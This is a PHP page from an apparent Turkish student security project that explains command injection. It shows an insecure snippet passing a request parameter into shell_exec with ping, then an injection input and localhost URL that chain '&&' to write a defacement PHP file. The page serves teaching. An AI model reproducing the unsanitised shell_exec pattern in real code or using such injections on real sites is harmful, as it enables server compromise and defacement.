<?php
	include 'veritabani.php'; // veritabani ile baglanti kurulur
	if(empty($_SESSION)) // veritabani baglantisi kontrol edilir
	   session_start();
	if(!isset($_SESSION['kull_adi'])){ // kullanici girisi yapilmamis ise
	   header("Location: index.php"); // index.php ye yonlendir
	   exit;
	} 
?>

<html>
	<head>
		<title>YazLab II 3.Proje</title> <!- sayfanin sekme basligi ->
		<link rel="shortcut icon" href="img/icon.ico"> <!- img/icon.ico dosyasini sayfa iconu yapar ->
	</head>
	<body>
		<ul>
			</br><li><b>	Komut Enjeksiyonu Nedir?</b></li>
			<p>&emsp;Komut enjeksiyonu saldırganın zafiyet barındıran bir uygulama üzerinden hedef sistemde dilediği komutları çalıştırabilmesine denir.</p>
			<p>&emsp;Komut ile kastedilen şey Windows'ta CMD ve Linux'ta Terminal pencerelerine girilen sistem komutlarıdır.</p>
			<p>&emsp;Komut enjeksiyonu saldırısı büyük oranda yetersiz input denetleme mekanizması nedeniyle gerçekleşmektedir.</p>
			</br><li><b>	Güvensiz kodlama pratiği:</b></li>
			<p>&emsp;if( isset( $_POST[ 'giris_butonu' ]  ) ) {</br>// POST ile istedenen giris_butonu degeri gonderip gondermedigi kontrol edilir</p>
			<p>&emsp;$istenen = $_REQUEST[ 'ip_adresi' ];</br>// gonderilen ip_adresi degiskenindeki deger $istenen degiskenine atanir </p>
			<p>&emsp;if( stristr( php_uname( 's' ), 'Windows NT' ) ) { </br>// islemci secilir ve ping komutu calistirilir</p>
			<p>&emsp;$cmd = shell_exec( 'ping  ' . $istenen );</br>// isletim sistemi windows ise gerceklestirilir</p>
			<p>&emsp;else{</br>$cmd = shell_exec( 'ping  -c 4 ' . $istenen );</br>// isletim sistemi windows haricinde ise gerceklestirilir </p>
			<p>&emsp;}</p>
			<p>&emsp;echo "{$cmd}"; </br>// duzenli olarak cmd ekrani ekrana basilir</p>
			<p>&emsp;}</p>
			<p>&emsp;<span style="color:Red">Metin kutusu denetlemeye tabi tutulmamışsa saldırgan komut satırı kodlama bilgisini kullanarak var olan ping komutunun yanına kendi komutunu ekleyebilir. Böylelikle ping komutunu çalıştıran sunucu istemeden saldırganın gönderdiği komutu da çalıştıracaktır ve ekrana yansıtacağı çıktının içinde saldırganın eklediği komutun çıktısı da yer alacaktır.</span></p>
			</br><li><b>	Örnek görüntü:</br></b></li></br>
			<img src="img/komut_enjeksiyonu1.png"/></br>
			</br><li><b>	Sömürü:</b></li>
			<p>&emsp;● Sitenin dosyalarına ulaşarak içindekileri silip kendi kodunuzu yazabilirsiniz.</p>
			<p><b>Kod örneğinde '*' ifadeleri yerine '<' koyulmalıdır...</b></p>
			<p>Metin Kutusuna Girilecek Kod:</br>localhost && echo "*font color=red>*center>*h1>Komut satiri enjeksiyonu ile site hacklendi.*/h1>*/center>*/font>*br>" > popup_komut_enjeksiyonu.php</p>
			<p>URL:</br>http://localhost/YazLab2_3/komut_enjeksiyonu.php?ip_adresi=localhost+%26%26+echo+%22%3Cfont+color%3Dred%3E%3Ccenter%3E%3Ch1%3EKomut+satiri+enjeksiyonu+ile+site+hacklendi.%3C%2Fh1%3E%3C%2Fcenter%3E%3C%2Ffont%3E*br%3E%22+%3E+popup_komut_enjeksiyonu.php&giris_butonu=Giris</p>
			<img src="img/komut_enjeksiyonu2.png"/></br>
			</br><li><b>	İyileştirme pratiği:</b></li>
			<p>&emsp;<span style="color:Red">Metin kutusu denetlemeye tabi tutarak ping işleminin yaninda ikinci bir komut dahil edilmesi engellenmelidir.</span></p>
		</ul>
	</body>
</html>